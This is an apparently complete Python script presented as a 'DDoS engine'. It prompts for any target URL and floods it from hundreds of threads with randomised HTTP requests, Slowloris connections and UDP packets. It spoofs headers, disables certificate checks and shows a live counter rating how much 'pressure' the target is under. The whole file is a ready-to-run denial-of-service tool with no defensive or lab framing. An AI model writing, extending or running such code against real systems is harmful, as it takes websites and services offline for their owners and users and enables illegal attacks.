# تغير مصدر يدل على فشلك، تلي: @v51rp
"""
▓█████▄  ██▀███   ▒█████   ██▓     ██▓     ▄▄▄      ▓█████▄ 
▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒▓██▒    ▓██▒    ▒████▄    ▒██▀ ██▌
░██   █▌▓██ ░▄█ ▒▒██░  ██▒▒██░    ▒██░    ▒██  ▀█▄  ░██   █▌
░▓█▄   ▌▒██▀▀█▄  ▒██   ██░▒██░    ▒██░    ░██▄▄▄▄██ ░▓█▄   ▌
░▒████▓ ░██▓ ▒██▒░ ████▓▒░░██████▒░██████▒ ▓█   ▓██▒░▒████▓ 
 ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░▓  ░░ ▒░▓  ░ ▒▒   ▓▒█░ ▒▒▓  ▒ 
 ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░ ▒  ░░ ░ ▒  ░  ▒   ▒▒ ░ ░ ▒  ▒ 
 ░ ░  ░   ░░   ░ ░ ░ ░ ▒    ░ ░     ░ ░     ░   ▒    ░ ░  ░ 
   ░       ░         ░ ░      ░  ░    ░  ░      ░  ░   ░    
 ░                                                      ░    
              PYTHON ULTIMATE DDoS ENGINE
           Version 4.0 - Attack Counter Edition
"""

import os
import sys
import time
import random
import socket
import threading
import ssl
import urllib.parse
import subprocess
import platform
from datetime import datetime

# ==================== AUTO-INSTALLER ====================
def install_requirements():
    """Install all required packages automatically"""
    print("🔧 Installing required packages...")
    
    requirements = ['colorama']
    
    for package in requirements:
        try:
            __import__(package)
            print(f"✅ {package} already installed")
        except ImportError:
            print(f"📦 Installing {package}...")
            try:
                subprocess.check_call([sys.executable, "-m", "pip", "install", package, "--quiet"])
                print(f"✅ {package} installed successfully")
            except:
                print(f"❌ Failed to install {package}")
                print(f"Please install manually: pip install {package}")

# ==================== COLORS ====================
class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    MAGENTA = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    BOLD = '\033[1m'
    END = '\033[0m'
    
    @staticmethod
    def gradient(text, color1, color2):
        """Create gradient text effect"""
        result = ""
        length = len(text)
        for i, char in enumerate(text):
            ratio = i / max(length - 1, 1)
            if ratio < 0.5:
                result += f"{color1}{char}"
            else:
                result += f"{color2}{char}"
        return result + Colors.END

# ==================== ATTACK COUNTER ====================
class AttackCounter:
    def __init__(self):
        self.total_attacks = 0
        self.successful_attacks = 0
        self.failed_attacks = 0
        self.attack_history = []
        self.start_time = None
        self.current_attack_id = 0
        self.lock = threading.Lock()
    
    def start_new_attack(self, target, threads, duration):
        """Start tracking a new attack"""
        with self.lock:
            self.current_attack_id += 1
            attack_info = {
                'id': self.current_attack_id,
                'target': target,
                'threads': threads,
                'duration': duration,
                'start_time': datetime.now(),
                'end_time': None,
                'total_requests': 0,
                'successful': 0,
                'failed': 0,
                'status': 'RUNNING'
            }
            self.attack_history.append(attack_info)
            self.start_time = time.time()
            return self.current_attack_id
    
    def update_attack(self, attack_id, requests=0, successful=0, failed=0):
        """Update attack statistics"""
        with self.lock:
            for attack in self.attack_history:
                if attack['id'] == attack_id:
                    attack['total_requests'] += requests
                    attack['successful'] += successful
                    attack['failed'] += failed
                    self.total_attacks += requests
                    self.successful_attacks += successful
                    self.failed_attacks += failed
                    break
    
    def complete_attack(self, attack_id, status='COMPLETED'):
        """Mark attack as completed"""
        with self.lock:
            for attack in self.attack_history:
                if attack['id'] == attack_id:
                    attack['end_time'] = datetime.now()
                    attack['status'] = status
                    attack['duration_actual'] = time.time() - self.start_time
                    break
    
    def get_current_stats(self):
        """Get current attack statistics"""
        with self.lock:
            if not self.attack_history:
                return {}
            
            current = self.attack_history[-1]
            elapsed = time.time() - self.start_time if self.start_time else 0
            
            return {
                'attack_id': current['id'],
                'target': current['target'],
                'elapsed_time': elapsed,
                'total_requests': current['total_requests'],
                'successful': current['successful'],
                'failed': current['failed'],
                'requests_per_sec': current['total_requests'] / max(elapsed, 1),
                'success_rate': (current['successful'] / max(current['total_requests'], 1)) * 100
            }
    
    def get_history_summary(self):
        """Get summary of all attacks"""
        with self.lock:
            if not self.attack_history:
                return "No attacks recorded yet"
            
            summary = []
            summary.append(f"\n{Colors.CYAN}{'═'*70}{Colors.END}")
            summary.append(f"{Colors.BOLD}📊 ATTACK HISTORY SUMMARY{Colors.END}")
            summary.append(f"{Colors.CYAN}{'═'*70}{Colors.END}")
            
            for attack in self.attack_history:
                duration = attack.get('duration_actual', attack['duration'])
                status_color = Colors.GREEN if attack['status'] == 'COMPLETED' else Colors.YELLOW if attack['status'] == 'RUNNING' else Colors.RED
                
                summary.append(f"{Colors.BLUE}Attack #{attack['id']}:{Colors.END}")
                summary.append(f"  Target: {Colors.WHITE}{attack['target']}{Colors.END}")
                summary.append(f"  Status: {status_color}{attack['status']}{Colors.END}")
                summary.append(f"  Requests: {Colors.RED}{attack['total_requests']:,}{Colors.END} | "
                             f"Successful: {Colors.GREEN}{attack['successful']:,}{Colors.END} | "
                             f"Failed: {Colors.YELLOW}{attack['failed']:,}{Colors.END}")
                summary.append(f"  Duration: {Colors.CYAN}{duration:.1f}s{Colors.END} | "
                             f"Threads: {Colors.MAGENTA}{attack['threads']}{Colors.END}")
                
                if attack['total_requests'] > 0:
                    success_rate = (attack['successful'] / attack['total_requests']) * 100
                    rate_color = Colors.GREEN if success_rate > 70 else Colors.YELLOW if success_rate > 30 else Colors.RED
                    summary.append(f"  Success Rate: {rate_color}{success_rate:.1f}%{Colors.END}")
                
                summary.append("")
            
            summary.append(f"{Colors.CYAN}{'═'*70}{Colors.END}")
            summary.append(f"{Colors.BOLD}📈 OVERALL STATISTICS:{Colors.END}")
            summary.append(f"  Total Attacks: {Colors.BLUE}{len(self.attack_history)}{Colors.END}")
            summary.append(f"  Total Requests: {Colors.RED}{self.total_attacks:,}{Colors.END}")
            summary.append(f"  Successful: {Colors.GREEN}{self.successful_attacks:,}{Colors.END}")
            summary.append(f"  Failed: {Colors.YELLOW}{self.failed_attacks:,}{Colors.END}")
            
            if self.total_attacks > 0:
                overall_rate = (self.successful_attacks / self.total_attacks) * 100
                overall_color = Colors.GREEN if overall_rate > 70 else Colors.YELLOW if overall_rate > 30 else Colors.RED
                summary.append(f"  Overall Success Rate: {overall_color}{overall_rate:.1f}%{Colors.END}")
            
            summary.append(f"{Colors.CYAN}{'═'*70}{Colors.END}")
            
            return '\n'.join(summary)

# ==================== TARGET MANAGER ====================
class TargetManager:
    def __init__(self, url):
        self.original_url = url
        self.parsed = urllib.parse.urlparse(url)
        self.host = self.parsed.netloc.split(':')[0]
        self.port = self.parsed.port or (443 if self.parsed.scheme == 'https' else 80)
        self.path = self.parsed.path if self.parsed.path else '/'
        self.scheme = self.parsed.scheme
        self.ip = None
        
        self.resolve_ip()
    
    def resolve_ip(self):
        """Resolve domain to IP"""
        try:
            self.ip = socket.gethostbyname(self.host)
            return True
        except socket.gaierror:
            self.ip = self.host
            return False

# ==================== ATTACK ENGINE ====================
class DDoSEngine:
    def __init__(self, target_manager, attack_counter, attack_id):
        self.target = target_manager
        self.counter = attack_counter
        self.attack_id = attack_id
        self.running = True
        self.lock = threading.Lock()
        
        # User agents pool
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/537.36',
            'Googlebot/2.1 (+http://www.google.com/bot.html)',
            'Mozilla/5.0 (Android 10; Mobile; rv:91.0) Gecko/91.0 Firefox/91.0'
        ]
    
    def generate_headers(self):
        """Generate random HTTP headers"""
        return {
            'User-Agent': random.choice(self.user_agents),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': 'max-age=0',
            'Referer': 'https://www.google.com/',
            'X-Forwarded-For': f'{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}',
            'X-Request-ID': str(random.randint(1000000, 9999999))
        }
    
    def http_flood(self):
        """HTTP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(3)
            sock.connect((self.target.ip, self.target.port))
            
            if self.target.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target.host)
            
            method = random.choice(['GET', 'POST', 'HEAD'])
            headers = self.generate_headers()
            
            params = ''
            if random.random() > 0.3:
                params = '?' + '&'.join([f'p{i}={random.randint(1, 100000)}' for i in range(random.randint(1, 5))])
            
            request = f"{method} {self.target.path}{params} HTTP/1.1\r\n"
            request += f"Host: {self.target.host}\r\n"
            
            for key, value in headers.items():
                request += f"{key}: {value}\r\n"
            
            request += "\r\n"
            
            sock.send(request.encode())
            
            success = False
            try:
                data = sock.recv(1024)
                if data:
                    success = True
            except:
                pass
            
            sock.close()
            
            # Update counter
            self.counter.update_attack(self.attack_id, requests=1, successful=1 if success else 0, failed=0 if success else 1)
            
            return success
            
        except Exception as e:
            self.counter.update_attack(self.attack_id, requests=1, successful=0, failed=1)
            return False
    
    def slowloris_attack(self):
        """Slowloris attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(10)
            sock.connect((self.target.ip, self.target.port))
            
            if self.target.scheme == 'https':
                context = ssl.create_default_context()
                context.check_hostname = False
                context.verify_mode = ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.target.host)
            
            request = f"GET {self.target.path}?id={random.randint(1, 1000000)} HTTP/1.1\r\n"
            request += f"Host: {self.target.host}\r\n"
            request += "User-Agent: Mozilla/5.0\r\n"
            
            sock.send(request.encode())
            
            for _ in range(random.randint(3, 8)):
                try:
                    time.sleep(random.uniform(5, 15))
                    sock.send(f"X-keep-alive: {random.randint(1, 1000)}\r\n".encode())
                except:
                    break
            
            sock.close()
            
            self.counter.update_attack(self.attack_id, requests=1, successful=1, failed=0)
            return True
            
        except:
            self.counter.update_attack(self.attack_id, requests=1, successful=0, failed=1)
            return False
    
    def udp_flood(self):
        """UDP flood attack"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.settimeout(1)
            
            payload = bytes([random.randint(0, 255) for _ in range(512)])
            
            ports = [80, 443, 53, 123, 8080]
            for port in ports:
                try:
                    sock.sendto(payload, (self.target.ip, port))
                except:
                    pass
            
            sock.close()
            
            self.counter.update_attack(self.attack_id, requests=len(ports), successful=len(ports), failed=0)
            return True
            
        except:
            self.counter.update_attack(self.attack_id, requests=1, successful=0, failed=1)
            return False
    
    def attack_worker(self, worker_id):
        """Worker thread for attacks"""
        attack_methods = [self.http_flood, self.slowloris_attack, self.udp_flood]
        
        while self.running:
            try:
                method = random.choice(attack_methods)
                method()
                time.sleep(random.uniform(0.01, 0.1))
            except:
                continue

# ==================== MAIN CONTROLLER ====================
class PythonDDoS:
    def __init__(self):
        self.target = None
        self.engine = None
        self.threads = 500
        self.duration = 300
        self.counter = AttackCounter()
        self.current_attack_id = 0
    
    def print_banner(self):
        """Print awesome banner"""
        os.system('cls' if platform.system() == 'Windows' else 'clear')
        
        banner = f"""
{Colors.CYAN}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════╗
║ ██████╗ ██╗   ██╗████████╗██╗  ██╗ ██████╗ ███╗   ██╗       ║
║ ██╔══██╗╚██╗ ██╔╝╚══██╔══╝██║  ██║██╔═══██╗████╗  ██║       ║
║ ██████╔╝ ╚████╔╝    ██║   ███████║██║   ██║██╔██╗ ██║       ║
║ ██╔═══╝   ╚██╔╝     ██║   ██╔══██║██║   ██║██║╚██╗██║       ║
║ ██║        ██║      ██║   ██║  ██║╚██████╔╝██║ ╚████║       ║
║ ╚═╝        ╚═╝      ╚═╝   ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═══╝       ║
║                                                              ║
║        {Colors.gradient("PYTHON DDoS ENGINE v4.0", Colors.RED, Colors.YELLOW)}          ║
║           {Colors.MAGENTA}ADVANCED ATTACK COUNTER SYSTEM{Colors.CYAN}             ║
╚══════════════════════════════════════════════════════════════╝
{Colors.END}
        """
        print(banner)
        
        # Show attack count
        history_summary = self.counter.get_history_summary()
        if "No attacks recorded yet" not in history_summary:
            print(f"\n{Colors.YELLOW}📈 Previous Attacks: {Colors.BLUE}{len(self.counter.attack_history)}{Colors.END}")
    
    def show_attack_counter(self):
        """Show attack counter information"""
        print(f"\n{Colors.MAGENTA}{'═'*60}{Colors.END}")
        print(f"{Colors.BOLD}🎯 ATTACK COUNTER SYSTEM{Colors.END}")
        print(f"{Colors.MAGENTA}{'═'*60}{Colors.END}")
        print(f"{Colors.BLUE}Total Attacks Executed:{Colors.END} {Colors.WHITE}{len(self.counter.attack_history)}{Colors.END}")
        print(f"{Colors.BLUE}Total Requests Sent:{Colors.END} {Colors.RED}{self.counter.total_attacks:,}{Colors.END}")
        print(f"{Colors.BLUE}Successful Requests:{Colors.END} {Colors.GREEN}{self.counter.successful_attacks:,}{Colors.END}")
        print(f"{Colors.BLUE}Failed Requests:{Colors.END} {Colors.YELLOW}{self.counter.failed_attacks:,}{Colors.END}")
        
        if self.counter.total_attacks > 0:
            success_rate = (self.counter.successful_attacks / self.counter.total_attacks) * 100
            color = Colors.GREEN if success_rate > 70 else Colors.YELLOW if success_rate > 30 else Colors.RED
            print(f"{Colors.BLUE}Overall Success Rate:{Colors.END} {color}{success_rate:.1f}%{Colors.END}")
        
        print(f"{Colors.MAGENTA}{'═'*60}{Colors.END}")
    
    def get_target(self):
        """Get target from user"""
        print(f"\n{Colors.YELLOW}[*] Enter target URL (http:// or https://){Colors.END}")
        print(f"{Colors.BLUE}    Example: http://example.com")
        print(f"    Example: https://target.site{Colors.END}")
        
        while True:
            url = input(f"\n{Colors.RED}[⚡] Target URL: {Colors.CYAN}")
            
            if not url:
                print(f"{Colors.RED}❌ URL cannot be empty{Colors.END}")
                continue
                
            if not url.startswith(('http://', 'https://')):
                url = 'http://' + url
            
            try:
                parsed = urllib.parse.urlparse(url)
                if not parsed.netloc:
                    print(f"{Colors.RED}❌ Invalid URL format{Colors.END}")
                    continue
                    
                return url
            except:
                print(f"{Colors.RED}❌ Invalid URL{Colors.END}")
    
    def get_attack_params(self):
        """Get attack parameters"""
        print(f"\n{Colors.YELLOW}[*] Attack Configuration{Colors.END}")
        
        while True:
            threads = input(f"{Colors.BLUE}[?] Threads (100-2000, default 500): {Colors.CYAN}")
            if not threads.strip():
                self.threads = 500
                break
            try:
                self.threads = int(threads)
                if 100 <= self.threads <= 2000:
                    break
                else:
                    print(f"{Colors.RED}❌ Threads must be between 100 and 2000{Colors.END}")
            except:
                print(f"{Colors.RED}❌ Invalid number{Colors.END}")
        
        while True:
            duration = input(f"{Colors.BLUE}[?] Duration in seconds (30-1800, default 300): {Colors.CYAN}")
            if not duration.strip():
                self.duration = 300
                break
            try:
                self.duration = int(duration)
                if 30 <= self.duration <= 1800:
                    break
                else:
                    print(f"{Colors.RED}❌ Duration must be between 30 and 1800 seconds{Colors.END}")
            except:
                print(f"{Colors.RED}❌ Invalid number{Colors.END}")
    
    def show_target_info(self):
        """Display target information"""
        info = {
            'url': self.target.original_url,
            'host': self.target.host,
            'ip': self.target.ip,
            'port': self.target.port,
            'scheme': self.target.scheme.upper(),
            'path': self.target.path
        }
        
        print(f"\n{Colors.GREEN}{'═'*60}{Colors.END}")
        print(f"{Colors.BOLD}🎯 TARGET INFORMATION{Colors.END}")
        print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
        print(f"{Colors.BLUE}URL:{Colors.END} {Colors.WHITE}{info['url']}{Colors.END}")
        print(f"{Colors.BLUE}Host:{Colors.END} {Colors.WHITE}{info['host']}{Colors.END}")
        print(f"{Colors.BLUE}IP Address:{Colors.END} {Colors.WHITE}{info['ip']}{Colors.END}")
        print(f"{Colors.BLUE}Port:{Colors.END} {Colors.WHITE}{info['port']}{Colors.END}")
        print(f"{Colors.BLUE}Protocol:{Colors.END} {Colors.WHITE}{info['scheme']}{Colors.END}")
        print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
        
        # Show attack number
        attack_num = len(self.counter.attack_history) + 1
        print(f"\n{Colors.MAGENTA}[📊] This will be Attack #{attack_num}{Colors.END}")
    
    def countdown(self, seconds=5, attack_id=0):
        """Countdown before attack"""
        print(f"\n{Colors.YELLOW}[*] Starting Attack #{attack_id} in:{Colors.END}\n")
        
        for i in range(seconds, 0, -1):
            bar = "█" * (seconds - i + 1) + "░" * (i - 1)
            attack_info = f"Attack #{attack_id}"
            print(f"\r{Colors.CYAN}[{bar}] {attack_info} - {i:02d} seconds ", end="", flush=True)
            time.sleep(1)
        
        print(f"\r{Colors.GREEN}[{'█'*seconds}] Attack #{attack_id} - LAUNCHING!{' '*20}{Colors.END}\n")
    
    def stats_display(self, attack_id):
        """Display live statistics"""
        start_time = time.time()
        
        while self.engine and self.engine.running:
            elapsed = time.time() - start_time
            
            if elapsed >= self.duration:
                if self.engine:
                    self.engine.running = False
                break
            
            stats = self.counter.get_current_stats()
            
            if stats and stats['attack_id'] == attack_id:
                # Progress bar
                progress_width = 40
                progress = int((elapsed / self.duration) * progress_width)
                bar = f"{Colors.GREEN}{'█' * progress}{Colors.CYAN}{'░' * (progress_width - progress)}{Colors.END}"
                
                print(f"\r{Colors.CYAN}[{bar}] ", end="")
                print(f"Attack #{attack_id} | ", end="")
                print(f"Time: {int(elapsed)}/{self.duration}s | ", end="")
                print(f"Requests: {Colors.RED}{stats['total_requests']:,}{Colors.END} | ", end="")
                print(f"Success: {Colors.GREEN}{stats['successful']:,}{Colors.END} | ", end="")
                print(f"RPS: {Colors.YELLOW}{stats['requests_per_sec']:.1f}{Colors.END}", end="", flush=True)
            
            time.sleep(0.5)
    
    def start_attack(self, attack_id):
        """Start the DDoS attack"""
        # Create and start threads
        threads = []
        
        for i in range(self.threads):
            t = threading.Thread(target=self.engine.attack_worker, args=(i,))
            t.daemon = True
            threads.append(t)
            t.start()
        
        # Start stats display
        stats_thread = threading.Thread(target=self.stats_display, args=(attack_id,))
        stats_thread.daemon = True
        stats_thread.start()
        
        # Run for duration
        try:
            time.sleep(self.duration)
            if self.engine:
                self.engine.running = False
            time.sleep(2)
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[!] Attack #{attack_id} stopped by user{Colors.END}")
            if self.engine:
                self.engine.running = False
            time.sleep(1)
        
        # Mark attack as completed
        self.counter.complete_attack(attack_id, 'COMPLETED' if time.time() - self.counter.start_time >= self.duration else 'INTERRUPTED')
    
    def show_attack_results(self, attack_id):
        """Show results for specific attack"""
        for attack in self.counter.attack_history:
            if attack['id'] == attack_id:
                print(f"\n\n{Colors.GREEN}{'═'*60}{Colors.END}")
                print(f"{Colors.BOLD}📊 RESULTS FOR ATTACK #{attack_id}{Colors.END}")
                print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
                
                print(f"{Colors.BLUE}Target:{Colors.END} {Colors.WHITE}{attack['target']}{Colors.END}")
                print(f"{Colors.BLUE}Status:{Colors.END} {Colors.GREEN if attack['status'] == 'COMPLETED' else Colors.YELLOW}{attack['status']}{Colors.END}")
                print(f"{Colors.BLUE}Duration:{Colors.END} {Colors.CYAN}{attack.get('duration_actual', self.duration):.1f}s{Colors.END}")
                print(f"{Colors.BLUE}Threads:{Colors.END} {Colors.MAGENTA}{attack['threads']}{Colors.END}")
                print(f"{Colors.BLUE}Total Requests:{Colors.END} {Colors.RED}{attack['total_requests']:,}{Colors.END}")
                print(f"{Colors.BLUE}Successful:{Colors.END} {Colors.GREEN}{attack['successful']:,}{Colors.END}")
                print(f"{Colors.BLUE}Failed:{Colors.END} {Colors.YELLOW}{attack['failed']:,}{Colors.END}")
                
                if attack['total_requests'] > 0:
                    rps = attack['total_requests'] / max(attack.get('duration_actual', self.duration), 1)
                    success_rate = (attack['successful'] / attack['total_requests']) * 100
                    
                    print(f"{Colors.BLUE}Requests/Second:{Colors.END} {Colors.YELLOW}{rps:.1f}{Colors.END}")
                    print(f"{Colors.BLUE}Success Rate:{Colors.END} ", end="")
                    
                    if success_rate > 70:
                        print(f"{Colors.GREEN}{success_rate:.1f}%{Colors.END}")
                    elif success_rate > 30:
                        print(f"{Colors.YELLOW}{success_rate:.1f}%{Colors.END}")
                    else:
                        print(f"{Colors.RED}{success_rate:.1f}%{Colors.END}")
                
                print(f"{Colors.GREEN}{'═'*60}{Colors.END}")
                
                # Evaluation
                if attack['successful'] > 10000:
                    print(f"\n{Colors.GREEN}✅ EXCELLENT! Target is under heavy pressure.{Colors.END}")
                elif attack['successful'] > 5000:
                    print(f"\n{Colors.YELLOW}⚠️  GOOD! Target is feeling the attack.{Colors.END}")
                else:
                    print(f"\n{Colors.RED}❌ WEAK! Target might be well protected.{Colors.END}")
                
                break
    
    def run(self):
        """Main run method"""
        try:
            # Install requirements
            install_requirements()
            
            # Main loop
            while True:
                self.print_banner()
                self.show_attack_counter()
                
                print(f"\n{Colors.YELLOW}[*] Main Menu{Colors.END}")
                print(f"{Colors.BLUE}[1]{Colors.END} Start New Attack")
                print(f"{Colors.BLUE}[2]{Colors.END} View Attack History")
                print(f"{Colors.BLUE}[3]{Colors.END} Exit")
                
                choice = input(f"\n{Colors.RED}[?] Select option: {Colors.CYAN}")
                
                if choice == "1":
                    # Start new attack
                    url = self.get_target()
                    self.target = TargetManager(url)
                    
                    self.show_target_info()
                    
                    if self.target.ip == self.target.host:
                        print(f"{Colors.YELLOW}[!] Could not resolve IP. Using hostname directly.{Colors.END}")
                    
                    self.get_attack_params()
                    
                    # Register new attack
                    attack_id = self.counter.start_new_attack(
                        target=self.target.original_url,
                        threads=self.threads,
                        duration=self.duration
                    )
                    
                    # Create attack engine
                    self.engine = DDoSEngine(self.target, self.counter, attack_id)
                    
                    # Countdown
                    self.countdown(3, attack_id)
                    
                    # Start attack
                    self.start_attack(attack_id)
                    
                    # Show results
                    self.show_attack_results(attack_id)
                    
                    # Ask to continue
                    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
                    
                elif choice == "2":
                    # View history
                    self.print_banner()
                    print(self.counter.get_history_summary())
                    input(f"\n{Colors.YELLOW}[*] Press Enter to continue...{Colors.END}")
                    
                elif choice == "3":
                    print(f"\n{Colors.GREEN}[✓] Goodbye! Total attacks executed: {len(self.counter.attack_history)}{Colors.END}")
                    break
                    
                else:
                    print(f"{Colors.RED}❌ Invalid choice{Colors.END}")
                    time.sleep(1)
        
        except KeyboardInterrupt:
            print(f"\n\n{Colors.YELLOW}[!] Program stopped{Colors.END}")
            print(f"{Colors.GREEN}[✓] Total attacks: {len(self.counter.attack_history)}{Colors.END}")
        except Exception as e:
            print(f"\n{Colors.RED}[✗] Error: {e}{Colors.END}")

# ==================== MAIN ====================
if __name__ == "__main__":
    tool = PythonDDoS()
    tool.run()